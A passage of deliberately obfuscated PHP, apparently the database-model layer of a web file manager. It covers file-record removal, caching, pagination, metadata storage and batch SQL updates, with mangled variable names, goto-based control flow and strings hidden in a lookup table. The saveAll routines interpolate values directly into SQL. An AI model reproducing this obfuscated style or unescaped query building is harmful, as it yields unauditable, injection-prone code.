get_path_father($C½Í¯Ì„Ê‚))) { $Aœ©…Š = !1; break; } $d·ï¸£óõ  = array($AŒ˜ƒ²À¹‰[441] => $fğÉ¢¶°Œ[$AŒ˜ƒ²À¹‰[441]]); goto a»µšìà¾à; b«Ê»ñ—Ğ½: $e½Äëâª…ã = $fğÉ¢¶°Œ[$AŒ˜ƒ²À¹‰[75]]; $C½Í¯Ì„Ê‚ = $fØ„½¨Ø¤¬ . str_replace("\x7b\151\x6f\x3a{$A‰ï­õÕÓÆ}\x7d\x2f", $AŒ˜ƒ²À¹‰[33], $e½Äëâª…ã); if (!IO::exist($e½Äëâª…ã)) { $Cíµ ½ê¤[] = $fğÉ¢¶°Œ[$AŒ˜ƒ²À¹‰[441]]; $F¦ÇÜÏ‰¼Û->updateFileEnd($fğÉ¢¶°Œ[$AŒ˜ƒ²À¹‰[28]], $fğÉ¢¶°Œ[$AŒ˜ƒ²À¹‰[77]]); continue; } goto F¨ê³ÇãË; a»µšìà¾à: $AÛå±ÙĞ¥“ = array($AŒ˜ƒ²À¹‰[753] => $Aêò¾‰¦ÇË, $AŒ˜ƒ²À¹‰[75] => $C½Í¯Ì„Ê‚); Model($AŒ˜ƒ²À¹‰[173])->where($d·ï¸£óõ )->save($AÛå±ÙĞ¥“); goto cêê¢äÂà; cêê¢äÂà: } $this->removeByFileID($Cíµ ½ê¤); goto F–è‘Ğ£ ˆ; E íƒó––í: $AŒ˜ƒ²À¹‰ =& $_SERVER[ç]; $d·ï¸£óõ  = array($AŒ˜ƒ²À¹‰[753] => $A‰ï­õÕÓÆ); $B‹„Œœ›¤Ã = Model($AŒ˜ƒ²À¹‰[444])->where($d·ï¸£óõ )->count(); goto D×ÁĞ·Šöœ; F–è‘Ğ£ ˆ: if (!$Aœ©…Š) { $F¦ÇÜÏ‰¼Û->stop($dÕÎ¹Š–Ù); return !1; } $F¦ÇÜÏ‰¼Û->end(); if ($eŒÇë†‰“Í == $AŒ˜ƒ²À¹‰[1620]) { $this->remove($A‰ï­õÕÓÆ); } goto AíÅ×Œ••; eœ®†´¿å¦: $fØ„½¨Ø¤¬ = "\x7b\x69\157\x3a{$Aêò¾‰¦ÇË}\175\x2f"; $Aœ©…Š = !0; $Cíµ ½ê¤ = array(); goto fµ§¯‘²Û³; AíÅ×Œ••: } public function progress($a÷Õ¬®Ö—, $bê·ší—µ) { return Task::get($bê·ší—µ . $_SERVER[ç][1966] . $a÷Õ¬®Ö—); } private function removeByFileID($Fğª·œÕó„ = array()) { goto AÊ¦‡³ó¤¥; CíçŠ‰ï‘£: foreach ($AÌÜĞŸÄà² as $A¸¯Ëƒîï) { Model($Ağ‚¦Ğ„…[403])->removeNow($A¸¯Ëƒîï, !1); } goto aëÀ«…«§; AÊ¦‡³ó¤¥: $Ağ‚¦Ğ„… =& $_SERVER[ç]; if (empty($Fğª·œÕó„)) { return; } $D¥ê„òáö° = array($Ağ‚¦Ğ„…[441] => array($Ağ‚¦Ğ„…[7], $Fğª·œÕó„)); goto a†ğ±ÑíßŞ; a†ğ±ÑíßŞ: $AÌÜĞŸÄà² = Model($Ağ‚¦Ğ„…[1171])->where($D¥ê„òáö°)->field($Ağ‚¦Ğ„…[390])->select(); if (!$AÌÜĞŸÄà²) { return; } $AÌÜĞŸÄà² = array_to_keyvalue($AÌÜĞŸÄà², $Ağ‚¦Ğ„…[33], $Ağ‚¦Ğ„…[390]); goto CíçŠ‰ï‘£; aëÀ«…«§: } private function removeShareItems($E¸‹ç»ÚË) { goto EŒÁö‡Â‘; EŒÁö‡Â‘: $EëÏ÷Ò°Ïï =& $_SERVER[ç]; $FšØ¡›Š­ = "\173\x69\157\72{$E¸‹ç»ÚË}\175\57"; $EİÅÁÔË“ = array($EëÏ÷Ò°Ïï[390] => 0, $EëÏ÷Ò°Ïï[1038] => array($EëÏ÷Ò°Ïï[378], "{$FšØ¡›Š­}\x25")); goto BÄáºª™¿º; BÄáºª™¿º: $aØ±ï°½ğ¢ = Model($EëÏ÷Ò°Ïï[1631])->where($EİÅÁÔË“)->field($EëÏ÷Ò°Ïï[462])->select(); if (empty($aØ±ï°½ğ¢)) { return; } $Cô˜ªÓÆ = array_to_keyvalue($aØ±ï°½ğ¢, $EëÏ÷Ò°Ïï[33], $EëÏ÷Ò°Ïï[462]); goto dºº»¨†; dºº»¨†: Model($EëÏ÷Ò°Ïï[558])->remove($Cô˜ªÓÆ); goto dÑÅ´“ö¯ì; dÑÅ´“ö¯ì: } } goto a”ËÛùŠ†; bÛ…ö¹å–Ë: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\151\x66\171\124\151\x6d\145", "\164\151\155\x65", "\151\x6e\163\x65\162\x74\x2c\165\x70\144\x61\x74\145", "\x66\165\156\143\164\x69\x6f\x6e"), array("\143\162\x65\141\164\145\x54\x69\155\145", "\x74\151\155\x65", "\x69\156\163\145\162\x74", "\x66\x75\x6e\143\x74\151\157\x6e")); public function setDataAuto($DØŒÎò„äã) { $this->dataAuto = $DØŒÎò„äã; } public function __construct($AÍ°ÂİÂ¸ = '', $Aì‘Ğá“óÂ = '', $c¬öŞÂíõš = '') { parent::__construct($AÍ°ÂİÂ¸, $Aì‘Ğá“óÂ, $c¬öŞÂíõš); } public static function textEncode($D¶ä§ò¯) { if (!$D¶ä§ò¯) { return $D¶ä§ò¯; } $eî÷‹„ï‹ì = json_encode($D¶ä§ò¯); $eî÷‹„ï‹ì = preg_replace_callback($_SERVER[ç][351], function ($F»„›Ñ²•½) { return addslashes($F»„›Ñ²•½[0]); }, $eî÷‹„ï‹ì); return json_decode($eî÷‹„ï‹ì); } public static function textDecode($C’Ì—£äÚÃ) { $B¾‡ÇğÊ =& $_SERVER[ç]; $a˜«¹÷‡ø½ = json_encode($C’Ì—£äÚÃ); $a˜«¹÷‡ø½ = preg_replace_callback($B¾‡ÇğÊ[352], function ($fÜ…è‘Ûİ) { return $_SERVER[ç][96]; }, $a˜«¹÷‡ø½); return json_decode($a˜«¹÷‡ø½); } protected $tableMeta = array(); protected function _beforeInsert(&$B£ğ½‚¸à², $e£§Œò¥‚æ) { $CğÊÉù«“ =& $_SERVER[ç]; if (!$this->checkDataAutoHas($CğÊÉù«“[353])) { return; } $this->dataBeforeFilter($B£ğ½‚¸à², $CğÊÉù«“[353]); } protected function _beforeUpdate(&$c™ÔÃŒÒÛ, $dŸôù ­Ö·) { $a†ŸÉ”Ö† =& $_SERVER[ç]; if (!$this->checkDataAutoHas($a†ŸÉ”Ö†[354])) { return; } $this->dataBeforeFilter($c™ÔÃŒÒÛ, $a†ŸÉ”Ö†[354]); } protected function _afterSelect(&$DÈå£ÜâÚ¹, $a§‡¡é¤Œ) { if (!is_array($DÈå£ÜâÚ¹)) { return; } if (!$this->checkDataAutoHas($_SERVER[ç][355])) { return; } foreach ($DÈå£ÜâÚ¹ as &$d‚ğ¤ÎÙ¾ñ) { $this->dataAfterFilter($d‚ğ¤ÎÙ¾ñ); } unset($d‚ğ¤ÎÙ¾ñ); } protected function _afterFind(&$C…ŒñóÎõ, $fÓµÂ±Ÿ²ï) { if (!is_array($C…ŒñóÎõ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ç][355])) { return; } $this->dataAfterFilter($C…ŒñóÎõ); } public function setAutoIncrement($C‚Ä¿†²Æ˜) { $aœÃ¿´ = array($this->getPk() => $C‚Ä¿†²Æ˜); $d¹¸¨Ÿ‰—£ = $this->data($aœÃ¿´)->add(); if ($d¹¸¨Ÿ‰—£) { $this->delete($d¹¸¨Ÿ‰—£); } } public function getAutoIncrement() { $aà¹«Š· = $this->getTableName(); $Bì—š´ĞÜ¬ = $this->max($this->getPk()); $A°‰¤ˆ£Ÿ = $this->query("\x73\150\x6f\167\40\164\141\142\154\x65\x20\x73\164\x61\164\x75\x73\40\167\x68\x65\x72\x65\40\x4e\141\x6d\145\x3d\x27{$aà¹«Š·}\47"); $Bïà®Ëâ× = $A°‰¤ˆ£Ÿ[0][$_SERVER[ç][356]]; $dƒ³—Íã‡´ = max($Bì—š´ĞÜ¬, $Bïà®Ëâ×); return $dƒ³—Íã‡´; } protected function _callBefore($f•Ø›Ü§¡, $d¯‰ƒ¡£¨) { return $this->cacheCallCheck($f•Ø›Ü§¡, $d¯‰ƒ¡£¨, !1); } protected function _callAfter($Dï£ñ†ŒÛì, $BÇ Çƒ¨Âš) { return $this->cacheCallCheck($Dï£ñ†ŒÛì, $BÇ Çƒ¨Âš, !0); } protected function cacheFunctionAlias($D³¨ìó¦â) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($A¢óØÔêó, $dÅ‰áÂøë, $B˜•éºõøé = false) { $dàŠ†ñÃèÔ = $this->cacheFunctionAlias($dÅ‰áÂøë); if (!$dàŠ†ñÃèÔ) { return; } foreach ($dàŠ†ñÃèÔ as $a‹İˆ˜õ™ä => $C¬«ÙÃƒ‡) { $aùÏñÃêÛÛ = $C¬«ÙÃƒ‡[0]; $bé¤‹¨ºŠ = explode($_SERVER[ç][47], $C¬«ÙÃƒ‡[1]); if ($A¢óØÔêó == $a‹İˆ˜õ™ä) { return $this->cacheFunctionGet($a‹İˆ˜õ™ä, $aùÏñÃêÛÛ); } if ($B˜•éºõøé && in_array($A¢óØÔêó, $bé¤‹¨ºŠ)) { $this->cacheFunctionClear($a‹İˆ˜õ™ä, $aùÏñÃêÛÛ); } } } public function cacheFunctionGet($b×¾¼Í¾Ì°, $b¯ÉÁß¾Í) { $a¥áÄ³®ë˜ = $this->cacheKeyMake($b×¾¼Í¾Ì°, $b¯ÉÁß¾Í); $cê¯·¾ˆÛ = Cache::get($a¥áÄ³®ë˜); if (!is_array($cê¯·¾ˆÛ)) { $cê¯·¾ˆÛ = call_user_func_array(array($this, $b×¾¼Í¾Ì°), array($b¯ÉÁß¾Í, !0)); Cache::set($a¥áÄ³®ë˜, $cê¯·¾ˆÛ); } return $cê¯·¾ˆÛ; } public function cacheFunctionClear($dëââ”ÓÄ¶, $c£Ş‹´ÏÀ) { $CÜËÈ‡šç‡ = $c£Ş‹´ÏÀ; if (!is_array($c£Ş‹´ÏÀ)) { $CÜËÈ‡šç‡ = array($c£Ş‹´ÏÀ); } foreach ($CÜËÈ‡šç‡ as $e¢¼ŞÀËø) { $Dæ°Š¤ãÅ¤ = $this->cacheKeyMake($dëââ”ÓÄ¶, $e¢¼ŞÀËø); Cache::remove($Dæ°Š¤ãÅ¤); } } private function cacheKeyMake($eîº’ĞØˆ, $eèÏÌªâ™½) { $dÖ†ÀĞº”Ò =& $_SERVER[ç]; return get_class($this) . $dÖ†ÀĞº”Ò[70] . $eîº’ĞØˆ . $dÖ†ÀĞº”Ò[357] . $eèÏÌªâ™½; } protected function selectPageReset() { $d¬¾éòšÄè =& $_SERVER[ç]; if (isset($GLOBALS[$d¬¾éòšÄè[358]])) { return; } $GLOBALS[$d¬¾éòšÄè[358]] = isset($GLOBALS[$d¬¾éòšÄè[7]][$d¬¾éòšÄè[359]]) ? $GLOBALS[$d¬¾éòšÄè[7]][$d¬¾éòšÄè[359]] : !1; $GLOBALS[$d¬¾éòšÄè[360]] = isset($GLOBALS[$d¬¾éòšÄè[7]][$d¬¾éòšÄè[349]]) ? $GLOBALS[$d¬¾éòšÄè[7]][$d¬¾éòšÄè[349]] : !1; $GLOBALS[$d¬¾éòšÄè[7]][$d¬¾éòšÄè[359]] = !1; $GLOBALS[$d¬¾éòšÄè[7]][$d¬¾éòšÄè[349]] = !1; } protected function selectPageRestore() { $cÎóÏÉİĞŞ =& $_SERVER[ç]; if (!isset($GLOBALS[$cÎóÏÉİĞŞ[358]])) { return; } $GLOBALS[$cÎóÏÉİĞŞ[7]][$cÎóÏÉİĞŞ[359]] = $GLOBALS[$cÎóÏÉİĞŞ[358]]; $GLOBALS[$cÎóÏÉİĞŞ[7]][$cÎóÏÉİĞŞ[349]] = $GLOBALS[$cÎóÏÉİĞŞ[360]]; unset($GLOBALS[$cÎóÏÉİĞŞ[358]]); unset($GLOBALS[$cÎóÏÉİĞŞ[360]]); } protected function selectPage($FÀ£»Îö = 200, $e¦ßêÄÈ¹× = 1) { goto dÑÙ×º»ÏÒ; EÃ¤‰ñà¤: $fğäå—ç²ñ = 50000; $FÀ£»Îö = isset($in[$b¹¡ÌğÖ‡[359]]) && $in[$b¹¡ÌğÖ‡[359]] ? $in[$b¹¡ÌğÖ‡[359]] : $FÀ£»Îö; if ($FÀ£»Îö === -1) { $in[$b¹¡ÌğÖ‡[359]] = !1; $fğäå—ç²ñ = 100000000; $FÀ£»Îö = $fğäå—ç²ñ; } goto a´ö‹ÑÀ¦Æ; a´ö‹ÑÀ¦Æ: $a³‚“ßÊÅ = $F²äÑŠ©; $a³‚“ßÊÅ[$b¹¡ÌğÖ‡[361]] = array(); $FÀ£»Îö = intval($FÀ£»Îö); goto a‰†‡¼‹ÙË; EÃ®¿ö¿ß: $bŠœ‚»éå³ = array(); $eÂ‚…Úš‹ƒ = 1; if ($e¦ßêÄÈ¹× == 1 && $eÂ‚…Úš‹ƒ) { $this->optionsValue($F²äÑŠ©); $bŠœ‚»éå³ = $this->page($e¦ßêÄÈ¹×, $FÀ£»Îö)->select(); $FŠƒÕ‘ŒÓñ = is_array($bŠœ‚»éå³) ? count($bŠœ‚»éå³) : 0; if ($FŠƒÕ‘ŒÓñ <= $FÀ£»Îö) { $b²”›Œá  = 1; } else { $this->optionsValue($a³‚“ßÊÅ); $FŠƒÕ‘ŒÓñ = intval($this->count()); $b²”›Œá  = ceil($FŠƒÕ‘ŒÓñ / $FÀ£»Îö); } } else { $this->optionsValue($a³‚“ßÊÅ); $FŠƒÕ‘ŒÓñ = intval($this->count()); $b²”›Œá  = ceil($FŠƒÕ‘ŒÓñ / $FÀ£»Îö); $e¦ßêÄÈ¹× = $e¦ßêÄÈ¹× >= $b²”›Œá  ? $b²”›Œá  : $e¦ßêÄÈ¹×; $this->optionsValue($F²äÑŠ©); $bŠœ‚»éå³ = $this->page($e¦ßêÄÈ¹×, $FÀ£»Îö)->select(); } goto BŠÍ·›¯¨; a‰†‡¼‹ÙË: $FÀ£»Îö = $FÀ£»Îö <= 5 ? 5 : ($FÀ£»Îö >= $fğäå—ç²ñ ? $fğäå—ç²ñ : $FÀ£»Îö); $e¦ßêÄÈ¹× = intval(isset($in[$b¹¡ÌğÖ‡[349]]) && $in[$b¹¡ÌğÖ‡[349]] ? $in[$b¹¡ÌğÖ‡[349]] : $e¦ßêÄÈ¹×); $e¦ßêÄÈ¹× = $e¦ßêÄÈ¹× <= 1 ? 1 : $e¦ßêÄÈ¹×; goto EÃ®¿ö¿ß; fİ¦İèê: return $C¤º¹Ä”«˜; goto b’¦èáŸÉ™; BŠÍ·›¯¨: if (!is_array($bŠœ‚»éå³)) { $bŠœ‚»éå³ = array(); } if ($b²”›Œá  == 1) { $FŠƒÕ‘ŒÓñ = count($bŠœ‚»éå³); } $C¤º¹Ä”«˜ = array($b¹¡ÌğÖ‡[362] => array($b¹¡ÌğÖ‡[363] => $FŠƒÕ‘ŒÓñ, $b¹¡ÌğÖ‡[359] => $FÀ£»Îö, $b¹¡ÌğÖ‡[349] => $e¦ßêÄÈ¹×, $b¹¡ÌğÖ‡[364] => $b²”›Œá ), $b¹¡ÌğÖ‡[365] => $bŠœ‚»éå³); goto fİ¦İèê; dÑÙ×º»ÏÒ: $b¹¡ÌğÖ‡ =& $_SERVER[ç]; global $in; $F²äÑŠ© = $this->optionsValue(); goto EÃ¤‰ñà¤; b’¦èáŸÉ™: } protected function checkLength($dôæŸÓ‡­Å, $BÖé…½Š×‘ = 0, $Còå¿° ¼· = '') { $E¤¿±»èå‚ =& $_SERVER[ç]; $BÖé…½Š×‘ = $BÖé…½Š×‘ ? $BÖé…½Š×‘ : 65536; if (!$dôæŸÓ‡­Å || strlen($dôæŸÓ‡­Å) < $BÖé…½Š×‘) { return; } $Còå¿° ¼· = $Còå¿° ¼· ? $Còå¿° ¼· . $E¤¿±»èå‚[67] : $E¤¿±»èå‚[33]; show_json($Còå¿° ¼· . LNG($E¤¿±»èå‚[366]) . "\x28{$BÖé…½Š×‘}\x29", !1); } protected function metaSet($cË¶ÏÁ–Ü™, $c‚—ÚÏ†¨ = null, $CñÄßà­ = null) { goto b«óğßËÆ­; d¼àöÌÔª: if (is_null($c‚—ÚÏ†¨)) { return $fµ‡Õ‘Ö°Ï->where(array($bø•ØãƒÖË => $cË¶ÏÁ–Ü™))->delete(); } if (is_null($CñÄßà­) && is_string($c‚—ÚÏ†¨)) { return $fµ‡Õ‘Ö°Ï->where($cÒå’âÀ—¤)->delete(); } $Aô©ˆšç‘ = is_array($c‚—ÚÏ†¨) ? $c‚—ÚÏ†¨ : array(); goto cæŒ†ê“; bŸÙÏ½…½–: $aìµ±ŞÁ¾Ú = $this->tableMeta[$C£Öœëö[368]]; $fµ‡Õ‘Ö°Ï = Model($aìµ±ŞÁ¾Ú); $cÒå’âÀ—¤ = array($bø•ØãƒÖË => $cË¶ÏÁ–Ü™, $C£Öœëö[369] => $c‚—ÚÏ†¨); goto d¼àöÌÔª; CÙ·Ò»¹˜ö: $aïÁù›îÌ = $C£Öœëö[371] . $this->tableMeta; CacheLock::lock($aïÁù›îÌ); $fµ‡Õ‘Ö°Ï->where(array($bø•ØãƒÖË => $cË¶ÏÁ–Ü™))->addAll($Dã Ğ•èÁŸ, array(), !0); goto EëæÂ¦Á‹‡; cæŒ†ê“: if (is_string($c‚—ÚÏ†¨)) { $Aô©ˆšç‘[$c‚—ÚÏ†¨] = $CñÄßà­; } $Dã Ğ•èÁŸ = array(); foreach ($Aô©ˆšç‘ as $f†ÇåšŸñ => $f¼”Š’Ôò¦) { $this->checkLength($f¼”Š’Ôò¦, !1, $aìµ±ŞÁ¾Ú . $C£Öœëö[4] . $f†ÇåšŸñ); $Dã Ğ•èÁŸ[] = array($bø•ØãƒÖË => $cË¶ÏÁ–Ü™, $C£Öœëö[92] => $f†ÇåšŸñ, $C£Öœëö[370] => $f¼”Š’Ôò¦); } goto CÙ·Ò»¹˜ö; EëæÂ¦Á‹‡: CacheLock::unlock($aïÁù›îÌ); return !0; goto e„›ºİŸ±Ó; b«óğßËÆ­: $C£Öœëö =& $_SERVER[ç]; if (!$this->tableMeta || !$cË¶ÏÁ–Ü™) { return !1; } $bø•ØãƒÖË = $this->tableMeta[$C£Öœëö[367]]; goto bŸÙÏ½…½–; e„›ºİŸ±Ó: } public function metaGet($Fï§ğ„‘É£, $bÚœÍ­Õ½ = false) { goto b¥œ ™Ó‡Ë; F”æ‹óá¿: $cÓÇè‘Æã = Model($this->tableMeta[$a¶­¨¯íİœ[368]]); if ($bÚœÍ­Õ½) { $e†êŒ¶‡¶Ö = array($Fî“›„ªå– => $Fï§ğ„‘É£, $a¶­¨¯íİœ[92] => $bÚœÍ­Õ½); return $cÓÇè‘Æã->where($e†êŒ¶‡¶Ö)->getField($a¶­¨¯íİœ[370]); } $e†êŒ¶‡¶Ö = array($Fî“›„ªå– => $Fï§ğ„‘É£); goto Fãì¸Ğ §ñ; b¥œ ™Ó‡Ë: $a¶­¨¯íİœ =& $_SERVER[ç]; if (!$this->tableMeta) { return array(); } $Fî“›„ªå– = $this->tableMeta[$a¶­¨¯íİœ[367]]; goto F”æ‹óá¿; Fãì¸Ğ §ñ: $B‡Ñâƒ¶ª = $cÓÇè‘Æã->field($a¶­¨¯íİœ[372])->where($e†êŒ¶‡¶Ö)->select(); $B‡Ñâƒ¶ª = array_to_keyvalue($B‡Ñâƒ¶ª, $a¶­¨¯íİœ[92], $a¶­¨¯íİœ[370]); return $B‡Ñâƒ¶ª; goto cßÑîøÀƒ¯; cßÑîøÀƒ¯: } private function checkDataAutoHas($aÉœÎÓ•) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $b‹•É©è†²) { if (in_array($aÉœÎÓ•, explode($_SERVER[ç][47], $b‹•É©è†²[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$a£ë´‘ˆŞ¹, $D„¹•†Ñ·¦) { $eÕ¥–äŸğŒ =& $_SERVER[ç]; foreach ($this->dataAuto as $eˆÜÑ›öáÃ) { $BÓ¾«ØÀÑ = $eˆÜÑ›öáÃ[0]; if (!in_array($D„¹•†Ñ·¦, explode($eÕ¥–äŸğŒ[47], $eˆÜÑ›öáÃ[2]))) { continue; } switch (trim($eˆÜÑ›öáÃ[3])) { case $eÕ¥–äŸğŒ[317]: case $eÕ¥–äŸğŒ[318]: $B‹¢Ú°ñ• = $eˆÜÑ›öáÃ[1]; $aĞÛ­¡¬ëÙ = isset($eˆÜÑ›öáÃ[4]) ? (array) $eˆÜÑ›öáÃ[4] : array(); if ($B‹¢Ú°ñ• == $eÕ¥–äŸğŒ[195] && array_key_exists($BÓ¾«ØÀÑ, $a£ë´‘ˆŞ¹)) { if (!$a£ë´‘ˆŞ¹[$BÓ¾«ØÀÑ]) { unset($a£ë´‘ˆŞ¹[$BÓ¾«ØÀÑ]); } break; } if (isset($a£ë´‘ˆŞ¹[$BÓ¾«ØÀÑ])) { array_unshift($aĞÛ­¡¬ëÙ, $a£ë´‘ˆŞ¹[$BÓ¾«ØÀÑ]); } if ($eÕ¥–äŸğŒ[317] == $eˆÜÑ›öáÃ[3]) { $a£ë´‘ˆŞ¹[$BÓ¾«ØÀÑ] = call_user_func_array($B‹¢Ú°ñ•, $aĞÛ­¡¬ëÙ); } else { $a£ë´‘ˆŞ¹[$BÓ¾«ØÀÑ] = call_user_func_array(array(&$this, $B‹¢Ú°ñ•), $aĞÛ­¡¬ëÙ); } break; case $eÕ¥–äŸğŒ[269]: $a£ë´‘ˆŞ¹[$BÓ¾«ØÀÑ] = $a£ë´‘ˆŞ¹[$eˆÜÑ›öáÃ[1]]; break; case $eÕ¥–äŸğŒ[290]: if (isset($a£ë´‘ˆŞ¹[$BÓ¾«ØÀÑ]) && !is_string($a£ë´‘ˆŞ¹[$BÓ¾«ØÀÑ])) { $a£ë´‘ˆŞ¹[$BÓ¾«ØÀÑ] = json_encode_force($a£ë´‘ˆŞ¹[$BÓ¾«ØÀÑ]); } break; case $eÕ¥–äŸğŒ[319]: if ($a£ë´‘ˆŞ¹[$BÓ¾«ØÀÑ] === $eÕ¥–äŸğŒ[33]) { unset($a£ë´‘ˆŞ¹[$BÓ¾«ØÀÑ]); } break; case $eÕ¥–äŸğŒ[320]: $a£ë´‘ˆŞ¹[$BÓ¾«ØÀÑ] = $eˆÜÑ›öáÃ[1]; default: break; } } if ($D„¹•†Ñ·¦ == $eÕ¥–äŸğŒ[353]) { $CÑÄ¹³¬‹ = strtolower($this->db->getDbType()); if (strpos($CÑÄ¹³¬‹, $eÕ¥–äŸğŒ[9]) !== 0) { return; } $Eš”ì„’öÁ = $this->field(!0)->fields; $AÇæùè‡ã– = $Eš”ì„’öÁ[$eÕ¥–äŸğŒ[248]]; if (isset($Eš”ì„’öÁ[$eÕ¥–äŸğŒ[247]])) { unset($AÇæùè‡ã–[$Eš”ì„’öÁ[$eÕ¥–äŸğŒ[247]]]); } foreach ($AÇæùè‡ã– as $bòó¾‡Û³× => $D„¹•†Ñ·¦) { if (!isset($a£ë´‘ˆŞ¹[$bòó¾‡Û³×])) { $a£ë´‘ˆŞ¹[$bòó¾‡Û³×] = $eÕ¥–äŸğŒ[33]; } } } } private function dataAfterFilter(&$C‡…²‰ğÖó) { $F£Ø£óĞŒµ =& $_SERVER[ç]; foreach ($this->dataAuto as $fÚ½Ò÷á…ª) { $eáÑ¦‘öš = $fÚ½Ò÷á…ª[0]; if (!in_array($F£Ø£óĞŒµ[355], explode($F£Ø£óĞŒµ[47], $fÚ½Ò÷á…ª[2]))) { continue; } if (!isset($C‡…²‰ğÖó[$eáÑ¦‘öš])) { continue; } switch (trim($fÚ½Ò÷á…ª[3])) { case $F£Ø£óĞŒµ[317]: case $F£Ø£óĞŒµ[318]: $dÂä‚”‰œ = isset($fÚ½Ò÷á…ª[4]) ? (array) $fÚ½Ò÷á…ª[4] : array(); array_unshift($dÂä‚”‰œ, $C‡…²‰ğÖó[$eáÑ¦‘öš]); if ($F£Ø£óĞŒµ[317] == $fÚ½Ò÷á…ª[3]) { $C‡…²‰ğÖó[$eáÑ¦‘öš] = call_user_func_array($fÚ½Ò÷á…ª[1], $dÂä‚”‰œ); } else { $C‡…²‰ğÖó[$eáÑ¦‘öš] = call_user_func_array(array(&$this, $fÚ½Ò÷á…ª[1]), $dÂä‚”‰œ); } break; case $F£Ø£óĞŒµ[269]: $C‡…²‰ğÖó[$eáÑ¦‘öš] = $C‡…²‰ğÖó[$fÚ½Ò÷á…ª[1]]; break; case $F£Ø£óĞŒµ[290]: $fè ³ßÉ = $C‡…²‰ğÖó[$eáÑ¦‘öš]; $C‡…²‰ğÖó[$eáÑ¦‘öš] = json_decode($fè ³ßÉ, !0); if (is_null($C‡…²‰ğÖó[$eáÑ¦‘öš])) { $C‡…²‰ğÖó[$eáÑ¦‘öš] = $fè ³ßÉ; } break; case $F£Ø£óĞŒµ[319]: if ($C‡…²‰ğÖó[$eáÑ¦‘öš] === $F£Ø£óĞŒµ[33]) { unset($C‡…²‰ğÖó[$eáÑ¦‘öš]); } break; case $F£Ø£óĞŒµ[320]: $C‡…²‰ğÖó[$eáÑ¦‘öš] = $fÚ½Ò÷á…ª[1]; default: break; } } } public function saveAll($E…½„ ÓÒ‘) { goto eÍÖ‰øš‡; F–ïĞ‹ ’¯: $fùßÅ¢Ö¥‚ = array(); $B­‚×¤î¯ = count($E…½„ ÓÒ‘); for ($EÑÓÓîš = 0; $EÑÓÓîš < $B­‚×¤î¯; $EÑÓÓîš++) { $eùåÁ¶§íå = $E…½„ ÓÒ‘[$EÑÓÓîš]; if (!is_array($eùåÁ¶§íå) || count($eùåÁ¶§íå) != 4) { continue; } $Cà¡•É’™ä = "\125\120\x44\101\x54\105\40\x60{$EÎ¨ŠÛé“}\x60\x20\x53\x45\x54\40{$eùåÁ¶§íå[2]}\x20\75\40\x43\x41\x53\x45\x20{$eùåÁ¶§íå[0]}\x20\xa"; if ($B­çØ¾İß == 0) { $dÒ¦äÎ–ÑŒ = $Cà¡•É’™ä; } $fùßÅ¢Ö¥‚[] = $däÑÑ¹ôµ–[115] . $eùåÁ¶§íå[1] . $däÑÑ¹ôµ–[115]; $B­çØ¾İß++; $dÒ¦äÎ–ÑŒ .= "\x20\x57\110\x45\x4e\x20\x27{$eùåÁ¶§íå[1]}\x27\40\124\110\x45\116\x20\x27{$eùåÁ¶§íå[3]}\47\x20\xa"; if ($B­çØ¾İß == $A­í‡â‚ØĞ || $EÑÓÓîš == $B­‚×¤î¯ - 1) { goto E­È›¶ì‚; A„‰¥’¯ĞÆ: $B­çØ¾İß = 0; $dÒ¦äÎ–ÑŒ = $Cà¡•É’™ä; $this->chunkEventCheck(count($fùßÅ¢Ö¥‚)); goto AìÒä£‹ß½; AìÒä£‹ß½: $fùßÅ¢Ö¥‚ = array(); goto eÓ—¯Î×ñµ; E­È›¶ì‚: $CÈğøî½Œ = implode($däÑÑ¹ôµ–[47], $fùßÅ¢Ö¥‚); $dÒ¦äÎ–ÑŒ .= "\40\x45\x4e\104\x20\x20\x57\x48\x45\x52\x45\40{$eùåÁ¶§íå[0]}\x20\x49\116\x20\x28{$CÈğøî½Œ}\x29\x20"; $this->execute($dÒ¦äÎ–ÑŒ); goto A„‰¥’¯ĞÆ; eÓ—¯Î×ñµ: } } goto B¦ÇÔƒÀğÄ; eÍÖ‰øš‡: $däÑÑ¹ôµ– =& $_SERVER[ç]; $EÎ¨ŠÛé“ = $this->tablePrefix . $this->tableName; $A­í‡â‚ØĞ = self::SQL_WHERE_IN_CHUNK; goto EÓÍÒ–éÆï; EÓÍÒ–éÆï: $E…½„ ÓÒ‘ = is_array($E…½„ ÓÒ‘) ? $E…½„ ÓÒ‘ : array(); $dÒ¦äÎ–ÑŒ = $däÑÑ¹ôµ–[373]; $B­çØ¾İß = 0; goto F–ïĞ‹ ’¯; B¦ÇÔƒÀğÄ: $this->chunkEventSet(); goto d”…ã¤Œƒ²; d”…ã¤Œƒ²: } public function saveAllEach($a ‚ Œ¢ç­) { $E»®»…òø =& $_SERVER[ç]; $A½î–…îÎ = $this->tablePrefix . $this->tableName; foreach ($a ‚ Œ¢ç­ as $B£÷ö›“°¢) { if (!is_array($B£÷ö›“°¢) || count($B£÷ö›“°¢) != 4) { continue; } $EÎ¨½ˆöÓ‰ = $B£÷ö›“°¢[0] . $E»®»…òø[374] . $B£÷ö›“°¢[1] . $E»®»…òø[115]; $AÜÄÇ§—•Ç = $B£÷ö›“°¢[2] . $E»®»…òø[374] . $B£÷ö›“°¢[3] . $E»®»…òø[115]; $a¤® æã” = "\165\x70\x64\x61\164\145\x20{$A½î–…îÎ}\40\x73\x65\x74\x20{$AÜÄÇ§—•Ç}\x20\x77\x68\145\162\145\x20{$EÎ¨½ˆöÓ‰}\73"; $this->execute($a¤® æã”); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($C·ù´øº = false, $D³íàÊÓÑ¾ = false) { $this->_chunkEvent = $C·ù´øº; $this->_chunkEventParam = $D³íàÊÓÑ¾; } private function chunkEventCheck($CäÄï‡Œİõ) { if (!$this->_chunkEvent) { return; } $bÍ¢ ¹ÈæÍ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $bÍ¢ ¹ÈæÍ[$_SERVER[ç][375]] = $CäÄï‡Œİõ; Hook::trigger($this->_chunkEvent, $bÍ¢ ¹ÈæÍ); } public function addAll($B“¤ÔË§‡, $Aª—Ò§¥‘ = array(), $aÊ…»¹Õã¹ = false) { goto F•†½Ãâ´°; 